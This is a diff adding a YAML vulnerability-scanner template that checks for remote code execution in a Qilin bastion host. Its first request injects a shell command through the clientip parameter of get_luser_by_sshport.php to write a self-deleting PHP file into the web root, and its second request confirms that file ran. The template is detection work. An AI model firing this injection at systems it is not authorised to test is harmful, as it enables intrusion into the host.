@@ -1,0 +1,22 @@
+id: qilin-bastion-host-rce
+
+info:
+    name: qilin bastion host rce
+    author: For3stCo1d (https://github.com/For3stCo1d)
+    severity: high
+
+set:
+  r2: randomLowercase(10)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /get_luser_by_sshport.php?clientip=1;echo%20"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>">/opt/freesvr/web/htdocs/freesvr/audit/{{r2}}.php;&clientport=1
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /{{r2}}.php
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(r2)))
+expression: r0() && r1()
+
